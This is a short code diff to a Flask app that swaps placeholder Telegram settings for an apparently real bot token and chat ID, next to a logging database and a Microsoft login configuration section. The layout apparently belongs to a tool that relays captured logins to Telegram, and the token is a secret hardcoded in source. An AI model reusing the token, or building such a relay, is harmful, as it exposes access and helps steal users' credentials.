@@ -19,8 +19,8 @@ app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 DB_NAME = "logs.db"
 
 # ================== TELEGRAM CONFIG ==================
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your actual bot token
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Replace with your actual chat ID
+TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"  # Replace with your actual bot token
+TELEGRAM_CHAT_ID = "8689962848"      # Replace with your actual chat ID
 # ====================================================
 
 # ================== MICROSOFT LOGIN CONFIG ==================
